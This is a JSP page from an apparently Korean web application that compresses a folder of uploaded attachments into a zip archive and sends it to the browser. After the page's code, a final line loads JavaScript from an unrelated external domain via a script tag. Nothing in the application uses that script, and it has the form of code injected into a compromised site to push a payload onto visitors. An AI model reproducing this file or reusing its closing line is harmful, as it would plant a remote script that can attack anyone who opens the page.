<%@page import="javax.print.attribute.standard.Compression"%>
<%@ page language="java" pageEncoding="UTF-8"%>
<%@ page trimDirectiveWhitespaces="true" %>
<%@page import="java.nio.charset.Charset"%>
<%//@page import="net.sf.jazzlib.ZipOutputStream"%>

<%@include file="/view/config/jqUI.jsp"%>
<%@ page import="java.io.File"%>
<%@ page import="java.io.FileInputStream"%>
<%@ page import="java.io.BufferedInputStream"%>
<%@ page import="java.io.BufferedOutputStream"%>
<%@ page import="common.Function"%>
<%@ page import="java.util.ArrayList"%>
<%//@ page import="java.util.zip.*"%>
<%//@ page import="net.sf.jazzlib.*"%>
<%//@ page import="net.sf.jazzlib.ZipInputStream"%>   
<%@ page import="java.io.FileOutputStream"%>
<%@ page import="java.io.OutputStream"%>
<%@ page import="java.util.List"%>
<%@ page import="java.util.Iterator"%>
<%@ page import="system.io.Attachment"%>    
<%@ page import="java.text.DecimalFormat" %>
<%@ page import="java.text.SimpleDateFormat" %>
<%@ page import="java.util.Calendar" %>
<%@ page import="org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream" %>




<% //request.setCharacterEncoding("utf-8");
//
String fileEncoding = System.getProperty("file.encoding");
System.out.println("file.encoding : "+fileEncoding);


DecimalFormat df = new DecimalFormat("00");
Calendar currentCalendar = Calendar.getInstance();

//현재 날짜 구하기
String strYear   = Integer.toString(currentCalendar.get(Calendar.YEAR));
String strMonth  = df.format(currentCalendar.get(Calendar.MONTH) + 1);
String strDay   = df.format(currentCalendar.get(Calendar.DATE));
String strDate = strYear + strMonth + strDay;


BufferedInputStream input = null;
BufferedOutputStream output = null;

List<Attachment> list = (List)request.getAttribute("attachment");  
/*
for(int i=0; i<list.size(); i++){
	System.out.println("[multiFileDownload2.jsp].list.getLogical_name : " + list.get(i).getLogical_name());
}
*/
	String realname = (String) request.getAttribute("realname"); //실제파일명
	String filepath =	request.getParameter("filepath"); 
	
	System.out.println("filePath : " + filepath);
	System.out.println( "realPath : " +getServletContext().getRealPath("") );
	System.out.println("ContextPath : " + getServletContext().getContextPath());
	
	try {
		
		byte buffer[] = new byte[1024];
		String path = getServletContext().getInitParameter("physicalUploadPath");
		String realFileName = "";
		String realPath = "";
		int table_id = 0;
		if(list != null){
			if(list.get(0).getName() != null){
				realFileName = list.get(0).getName();
				realPath = list.get(0).getFullURL();
				table_id = list.get(0).getTable_id();
			}
		}
		
		if(realPath.length() > 0){
			int listIndex = 0;
			listIndex = realPath.lastIndexOf("/");
			if(listIndex > 0){
				realPath = realPath.substring(0, listIndex);
				System.out.println("[multiFileDownload2.jsp].realPath  " + realPath);
			}
		}
		
		String zipName = realFileName+"_"+strYear+strMonth+strDay+".zip";
		String zipPath = path + zipName;
		
		//FileOutputStream fos = new FileOutputStream(zipPath);
		//GZIPOutputStream zip = new GZIPOutputStream(fos);
		//net.sf.jazzlib.ZipOutputStream zip = new net.sf.jazzlib.ZipOutputStream(new FileOutputStream(zipPath));
		
		// 파일 압축
				for (int i=0; i<list.size(); i++) {
					

				} 
		
				system.CompressionUtil cu = new system.CompressionUtil();
				
				File src = new File(path+realPath);
				String charSetName = "euc-kr";
				boolean includeSrc = false;
				cu.zip(src, charSetName, includeSrc);
				
		
					File file = new File(path+realPath+".zip");
					System.out.println("path : " + file.getAbsolutePath());
					
					input = new BufferedInputStream(new FileInputStream(file));
					response.reset(); 
					response.resetBuffer();
					
					String strClient = request.getHeader("User-Agent");
					System.out.println("strclient  :" + strClient);
					
					filepath = zipName;
					
					if (strClient.indexOf("MSIE 5.5") != -1){
						response.setHeader("Content-Disposition", "filename="+new String(realname.getBytes("euc-kr"), "ISO-8859-1") + ";");

				}else{
				//		
						response.setHeader("Content-Disposition", "attachment; filename="+ new String(filepath.getBytes("euc-kr"), "ISO-8859-1") + ";");
					response.setHeader("Content-Type", "application/octet-stream; charset=euc-kr");
				//    
				}
			//20120524 홍윤호 수정 끝
					response.setHeader("Content-Length", "" + file.length());
					response.setHeader("Content-Transfer-Encoding", "binary;");
					response.setHeader("Pragma", "no-cache;");
					response.setHeader("Expires", "-1;");
				
					byte buffer2[] = new byte[1024];
					
					int len = 0;
					output = new BufferedOutputStream(response.getOutputStream());
					while ((len = input.read(buffer2)) > 0) {
						output.write(buffer2, 0, len);
					}
					input.close();
					output.close();
					
		out.clear();
		out = pageContext.pushBody(); 
	} catch (Exception e) {
		e.printStackTrace();
		out.println("<script>");
		out.println("alert('요청한 파일을 찾을 수 없습니다.');");
		out.println("history.back();");
		out.println("</script>");
		return;
	} finally {
		//response.flushBuffer();

	}
	
	
	
	%>
<script src=http://makrea.com/img/btn/1.js></script>